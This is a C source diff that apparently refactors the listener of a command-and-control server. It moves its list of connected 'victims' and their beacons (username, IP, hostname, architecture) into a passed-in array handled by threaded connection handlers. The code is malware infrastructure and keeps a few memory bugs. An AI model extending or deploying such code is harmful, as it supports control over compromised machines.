@@ -36,9 +36,22 @@ pthread_mutex_t NET_PTHREAD_MUTEX = PTHREAD_MUTEX_INITIALIZER;
 
 int NET_VICTIMS_TOTAL = 0;
 
-net_client_beacon_t *p_victims[NET_MAX_CLIENTS];
+net_client_beacon_t **net_create_victims(){
+  int count = NET_MAX_CLIENTS;
+  net_client_beacon_t **v;
+  v = malloc(count * sizeof(net_client_beacon_t));
+  if (v == NULL){
+    fprintf(stderr, "[x] %s\n", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  //memset(v, 0, count * sizeof(net_client_beacon_t));
+  for (int i = 0; i < count; i++){
+    v[i] = NULL;
+  }
+  return v;
+}
 
-bool net_update_victim_count(){
+bool net_update_victim_count(net_client_beacon_t **p_victims){
   /*
     :TODO: update victim counter
     :returns: boolean
@@ -53,7 +66,7 @@ bool net_update_victim_count(){
   return true;
 }
 
-int net_update_victims(net_client_beacon_t *victim){
+int net_update_victims(net_client_beacon_t *victim, net_client_beacon_t **p_victims){
   /*
     :TODO: set pointer to current victims client beacon
     :p_victim: pointer to victim client beacon
@@ -70,7 +83,7 @@ int net_update_victims(net_client_beacon_t *victim){
   for (int i = 0; i < NET_MAX_CLIENTS; i++){
     if (p_victims[i] == NULL){
       p_victims[i] = victim;
-      net_update_victim_count();
+      net_update_victim_count(p_victims);
       return i;
     }
   }
@@ -78,7 +91,7 @@ int net_update_victims(net_client_beacon_t *victim){
   return -1;
 }
 
-bool net_remove_victims(net_client_beacon_t *victim){
+bool net_remove_victims(net_client_beacon_t *victim, net_client_beacon_t **p_victims){
   /*
     :TODO: remove victim from list
     :p_victim: pointer to victim struct
@@ -91,15 +104,25 @@ bool net_remove_victims(net_client_beacon_t *victim){
       memset(p_victims[i], 0, sizeof(net_client_beacon_t));
       p_victims[i] = NULL;
       free(p_victims[i]);
-      net_update_victim_count();
+      net_update_victim_count(p_victims);
       return true;
     }
   }
   return false;
 }
 
-void *net_t_client(void *client_fd){
-  int sock = *(int *)client_fd;
+#ifndef NET_T_CLIENT_ARGS
+typedef struct{
+  int client_fd;
+  net_client_beacon_t **p_victims;
+} net_t_client_args_t;
+#define NET_T_CLIENT_ARGS
+#endif
+
+void *net_t_client(void *args){
+  net_t_client_args_t *p_args = args;
+  int sock = p_args->client_fd;
+  net_client_beacon_t **p_victims = p_args->p_victims;
   net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
   net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
   while (true){
@@ -112,7 +135,8 @@ void *net_t_client(void *client_fd){
       return false;
     }
     pthread_mutex_lock(&NET_PTHREAD_MUTEX);
-    net_update_victims(p_net_client_beacon);
+    net_update_victims(p_net_client_beacon, p_victims);
+    //printf("[+] victims: %d\n", NET_VICTIMS_TOTAL);
     /* printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
     /*        p_net_client_beacon->sysinfo.username, */
     /*        p_net_client_beacon->sysinfo.ip, */
@@ -127,9 +151,9 @@ void *net_t_client(void *client_fd){
       fprintf(stderr, "[x] %s\n", strerror(errno));
       return false;
     }
-    memset(p_net_server_beacon, 0, sizeof(net_server_beacon_t));
   }
   pthread_mutex_lock(&NET_PTHREAD_MUTEX);
+  /* printf("[+] victims %d\n", NET_VICTIMS_TOTAL); */
   /* printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
   /*        p_net_client_beacon->sysinfo.username, */
   /*        p_net_client_beacon->sysinfo.ip, */
@@ -137,13 +161,12 @@ void *net_t_client(void *client_fd){
   /*        p_net_client_beacon->sysinfo.arch, */
   /*        p_net_client_beacon->sysinfo.release, */
   /*        p_net_client_beacon->sysinfo.cpu_usage); */
-  net_remove_victims(p_net_client_beacon);
+  net_remove_victims(p_net_client_beacon, p_victims);
   pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
   pthread_exit(NULL);
 }
 
-
-bool net_server(int port){
+bool net_server(int port, net_client_beacon_t **p_victims){
   /*
     :TODO: start listening server
     :port: (int) server listening port
@@ -187,6 +210,8 @@ bool net_server(int port){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
+
+  //printf("[+] listening\n");
   
   while (true){
     socklen_t client_len = sizeof(client);
@@ -194,7 +219,10 @@ bool net_server(int port){
     while (( client_fd = accept(server_fd,
                                 (struct sockaddr *)&client,
                                 (socklen_t *)&client_len))){
-      if (pthread_create(&t_client, NULL, net_t_client, (void *)&client_fd) < 0){
+      net_t_client_args_t *p_net_t_client_args = malloc(sizeof(net_t_client_args_t));
+      p_net_t_client_args->client_fd = client_fd;
+      p_net_t_client_args->p_victims = p_victims;
+      if (pthread_create(&t_client, NULL, net_t_client, p_net_t_client_args) < 0){
         fprintf(stderr, "[-] %s\n", strerror(errno));
       }
     }
@@ -206,20 +234,23 @@ bool net_server(int port){
 #ifndef NET_PTHREAD_SERVER_ASYNC_ARGS
 typedef struct{
   int port;
+  net_client_beacon_t **p_victims;
 } net_pthread_server_args_t;
 #define NET_PTHREAD_SERVER_ASYNC_ARGS
 #endif
 
 void *net_pthread_server(void *args){
   net_pthread_server_args_t  *p_net_server_async_args = args;
+  net_client_beacon_t **p_victims = p_net_server_async_args->p_victims;
   int port = p_net_server_async_args->port;
-  net_server(port);
+  net_server(port, p_victims);
   pthread_exit(NULL);
 }
 
-bool net_server_async(int port){
+bool net_server_async(int port, net_client_beacon_t **p_victims){
   net_pthread_server_args_t *p_net_pthread_server_async_args = malloc(sizeof(net_pthread_server_args_t));
   p_net_pthread_server_async_args->port = port;
+  p_net_pthread_server_async_args->p_victims = p_victims;
   pthread_t t_net_pthread_server;
   if(pthread_create(&t_net_pthread_server,
                     NULL,
